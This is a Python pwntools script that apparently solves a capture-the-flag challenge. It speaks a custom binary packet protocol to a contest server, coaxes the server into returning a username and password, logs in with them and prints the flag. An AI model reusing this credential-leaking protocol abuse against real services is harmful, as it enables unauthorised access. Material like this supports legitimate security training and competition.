from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
host = "flu.xxx"
port = 2005

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

class MessageID:
    def __init__(s, id):
        s.id = id

class ID:
    def __init__(s, id):
        s.id = id

def gen_message_id(data):
    #if data[0] != '\x00':
    #    raise Exception('Error: {}'.format(just_u64(data[0])))
    return MessageID(ord(data[0]))

def gen_identifier(data):
    return ID(data)

def gen_member_id(data):
    ty = ord(data[0])
    if ty == 1:
        return None
    if ty == 2:
        raise Exception('bug')
    if ty == 3:
        return data[1:]
    if ty == 4:
        return data[1:]

msg_id = None
def generate_message_id():
    i = msg_id.id
    return chr(2) + chr(1) + chr(i)

ident = None
def generate_member():
    return chr(len(ident.id) + 1) + chr(2) + ident.id

def get():
    length = ord(recv(1))
    ty = ord(recv(1))
    s = recv(length - 1)
    #print(length, ty, s)
    if ty == 1:
        return gen_message_id(s)
    if ty == 2:
        return gen_identifier(s)
    if ty == 3:
        return gen_member_id(s)
    if ty == 255:
        raise Exception('Error code: {}'.format(hex(ord(s))))
    else:
        print(length, ty, s)
        return length, ty, s

def put_packet(ty, data):
    length = 1 + len(data)
    if length > 255:
        raise Exception('data is too large')
    send(( generate_message_id() +
            generate_member() +
            chr(length) + chr(ty) + data))


def get_packet_header():
    global msg_id, ident
    msg_id = get()
    ident = get()
    return


def do_member_id():
    get_packet_header()
    get() # message id
    put_packet(3, '\x02')
    get_packet_header()
    username = get()
    password = get()
    return username, password

def login(username, password):
    put_packet(4, '\x01')
    recvuntil('Username:')
    sendline(username)
    recvuntil('Password:')
    sendline(password)
    msg_id.id += 1
    ident = get()

def flag():
    put_packet(5, '\x01')
    get_packet_header()
    recvuntil('\x05')
    print(recvuntil('}') + '}')

u, p = do_member_id()
#print(u, p)
login(u, p)
flag()


